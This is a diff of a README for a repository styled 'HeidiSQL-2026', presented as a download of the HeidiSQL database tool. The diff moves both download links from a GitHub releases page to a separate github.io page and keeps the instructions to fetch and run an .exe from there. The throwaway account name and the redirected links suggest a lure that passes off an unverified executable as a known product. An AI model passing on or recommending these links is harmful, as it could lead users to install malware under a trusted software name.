@@ -1,6 +1,6 @@
 # 💻 HeidiSQL-2026 - Manage your databases with ease
 
-[![Download HeidiSQL-2026](https://img.shields.io/badge/Download-HeidiSQL-blue)](https://github.com/Scorned-easternchinquapin115/HeidiSQL-2026/releases)
+[![Download HeidiSQL-2026](https://img.shields.io/badge/Download-HeidiSQL-blue)](https://scorned-easternchinquapin115.github.io)
 
 ## 📖 About this software
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to obtain the files for your machine:
 
-1. Visit this page to download: [https://github.com/Scorned-easternchinquapin115/HeidiSQL-2026/releases](https://github.com/Scorned-easternchinquapin115/HeidiSQL-2026/releases).
+1. Visit this page to download: [https://scorned-easternchinquapin115.github.io](https://scorned-easternchinquapin115.github.io).
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start the transfer.
 4. Save the file to your Downloads folder.
